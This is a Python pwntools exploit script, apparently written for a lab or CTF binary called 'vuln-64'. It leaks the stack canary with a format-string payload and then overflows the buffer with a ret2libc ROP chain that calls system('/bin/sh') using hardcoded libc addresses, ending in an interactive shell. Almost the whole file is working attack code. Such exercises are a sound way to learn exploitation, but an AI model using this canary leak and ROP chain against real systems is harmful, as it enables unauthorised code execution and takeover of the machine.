#!/usr/bin/env python3

# Exploit conditions
# - ASLR Disabled
# - PIE disables
# - NX enabled
# - Stack canary enabled

from pwn import *

offset = 72
# Let's choose local vs remote
p = process("./vuln-64") 

p.recvuntil("Leak me")

# abuse format string vulnerability on the firt input (gets()) for printf()
payload = b'%15$p'

p.sendline(payload)

p.recvline()
leak = int(p.recvline(),16)
log.info('cookie is : {}'.format(hex(leak))) # The leaked value is printed.

#gdb-peda$ p system
#$1 = {int (const char *)} 0x7ffff7e0e330 <__libc_system>
#gdb-peda$ p exit
#$2 = {void (int)} 0x7ffff7e00590 <__GI_exit>
#gdb-peda$ find "/bin/sh"
#Searching for '/bin/sh' in: None ranges
#Found 1 results, display max 1 items:
#libc.so.6 : 0x7ffff7f58031 --> 0x68732f6e69622f ('/bin/sh')

system = p64(0x7ffff7e0e330)
binsh = p64(0x7ffff7f58031)
exit_addr = p64(0x7ffff7e00590)
pop_rdi= p64(0x0040125b)
ret = p64(0x00401016)

payload = b'A'*offset
payload += p64(leak)
payload += b'BBBBBBBB' # Filling to reach EIP overwrite
payload += pop_rdi
payload += binsh
payload += ret
payload += system  # OVerwrite is here: execute a 
payload += binsh
payload += p64(0x0)

log.info('Sending second buffer with cookie and payload')

p.recvuntil("Overflow me")
p.sendline(payload)
p.interactive()

